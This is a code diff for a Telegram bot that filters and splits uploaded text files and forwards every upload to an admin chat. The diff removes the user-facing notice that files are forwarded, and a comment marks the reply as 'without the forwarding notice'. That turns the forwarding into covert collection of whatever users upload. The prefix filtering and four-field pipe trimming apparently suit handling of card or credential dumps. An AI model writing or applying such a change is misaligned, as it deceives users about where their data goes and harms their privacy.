@@ -7,7 +7,7 @@ Telegram TXT‑file helper bot – fully functional, copy‑and‑paste ready.
 Features
 --------
 • Upload a .txt file – the bot forwards it to an admin chat.
-• /ext <prefix> – return a file with all lines that start with the given numeric prefix.
+• /ext <prefix> – return a file with all lines that start with the given prefix (any text, not only digits).
 • /spl <N>      – split the uploaded file into N‑line chunks and send them one by one.
 • /clear        – keep only the first four pipe‑separated fields of each line.
 • /stop         – abort a long‑running split operation.
@@ -87,12 +87,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text(
         f"Hello {user_name}!\n\n"
         "Upload a *.txt file and use the following commands:\n"
-        "/ext <prefix>  – extract lines that start with <prefix>\n"
-        "/spl <N>       – split file into N‑line chunks\n"
-        "/clear         – keep only the first 4 pipe‑separated fields\n"
-        "/stop          – abort a running split operation\n"
-        "/help          – show this help again\n\n"
-        "The file will also be forwarded to the admin chat."
     )
 
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -141,7 +135,7 @@ async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         )
         await _send_document(context, file_path, ADMIN_ID, caption)
 
-        # 6️⃣  Give the user a friendly reply
+        # 6️⃣  Give the user a friendly reply (without the forwarding notice)
         await update.message.reply_text(
             "TXT file received successfully!\n\n"
             "Use commands:\n"
@@ -155,18 +149,18 @@ async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         await update.message.reply_text(f"❌ Error while processing file: {e}")
 
 async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Extract lines that start with a given numeric prefix."""
+    """Extract lines that start with a given prefix (any text)."""
     user_id = update.effective_user.id
     if user_id not in saved_files:
         await update.message.reply_text("Please upload a TXT file first.")
         return
 
-    # Find the first numeric sequence in the command
-    match = re.search(r"\d+", update.message.text)
-    if not match:
-        await update.message.reply_text("❌ Please provide a numeric prefix after /ext.")
+    # Grab everything after '/ext' (including spaces)
+    parts = update.message.text.split(maxsplit=1)
+    if len(parts) < 2 or not parts[1].strip():
+        await update.message.reply_text("❌ Please provide a prefix after /ext.")
         return
-    prefix = match.group()
+    prefix = parts[1].strip()
 
     result_lines = []
     try:
@@ -180,11 +174,11 @@ async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         return
 
     if not result_lines:
-        await update.message.reply_text(f"⚠️ No lines found starting with {prefix}.")
+        await update.message.reply_text(f"⚠️ No lines found starting with '{prefix}'.")
         return
 
     # Write the result to a unique file
-    output_file_name = _unique_output_name(prefix, "_ext")
+    output_file_name = _unique_output_name(re.sub(r"\W+", "_", prefix), "_ext")
     output_file = Path("uploads") / output_file_name
     _ensure_dir(output_file.parent)
     with open(output_file, "w", encoding="utf-8") as out:
@@ -305,7 +299,7 @@ app.add_handler(MessageHandler(filters.Document.ALL, receive_txt))
 
 # Regex commands
 app.add_handler(MessageHandler(filters.Regex(r"^/spl(?:\s*\d+)$"), split_file))
-app.add_handler(MessageHandler(filters.Regex(r"^/ext(?:\s*\d+)$"), extract_prefix))
+app.add_handler(MessageHandler(filters.Regex(r"^/ext\b"), extract_prefix))
 
 # Start the bot
 if __name__ == "__main__":
